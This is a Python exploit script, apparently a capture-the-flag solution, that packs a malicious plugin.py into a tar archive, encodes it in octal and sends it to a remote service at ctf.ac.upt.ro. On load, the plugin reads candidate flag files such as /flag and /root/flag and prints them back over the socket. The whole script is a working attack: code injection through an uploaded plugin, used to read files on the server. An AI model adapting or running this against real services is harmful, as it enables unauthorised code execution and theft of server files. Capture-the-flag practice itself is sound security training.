#!/usr/bin/env python3
import tarfile, io, socket, sys, textwrap

HOST = "ctf.ac.upt.ro"
PORT = 9116
FLAG_PATHS = ["/app/flag.txt", "/flag", "/flag.txt", "/home/ctf/flag", "/root/flag"]

plugin_template = textwrap.dedent("""
def run():
    try:
        for p in {paths!r}:
            try:
                with open(p, "r") as f:
                    print(f.read().strip())
                    return
            except Exception:
                pass
        print("NO_FLAG_FOUND")
    except Exception as e:
        print("PLUGIN_ERROR", e)
""")

def make_octal_payload(paths):
    plugin_code = plugin_template.format(paths=paths).encode("utf-8")
    bio = io.BytesIO()
    with tarfile.open(fileobj=bio, mode="w") as tf:
        info = tarfile.TarInfo(name="plugin.py")
        info.size = len(plugin_code)
        tf.addfile(info, io.BytesIO(plugin_code))
    payload = bio.getvalue()
    octal_str = ''.join(f"{b:03o}" for b in payload) + "\n"
    if len(octal_str) > 300_000:
        raise RuntimeError("Octal payload too large for service limits")
    return octal_str

def send_and_receive(octal_payload, host, port):
    with socket.create_connection((host, port), timeout=5) as s:
        try:
            s.settimeout(2.0)
            pre = s.recv(4096)
            if pre:
                sys.stdout.write(pre.decode(errors="ignore"))
        except Exception:
            pass

        s.sendall(octal_payload.encode())

        s.settimeout(5.0)
        try:
            while True:
                data = s.recv(4096)
                if not data:
                    break
                sys.stdout.write(data.decode(errors="ignore"))
        except Exception:
            pass

if __name__ == "__main__":
    try:
        octal = make_octal_payload(FLAG_PATHS)
    except Exception as e:
        print("Failed to build payload:", e, file=sys.stderr)
        sys.exit(1)

    print(f"Connecting to {HOST} {PORT}")
    try:
        send_and_receive(octal, HOST, PORT)
    except Exception as e:
        print("Network error:", e, file=sys.stderr)
        sys.exit(2)
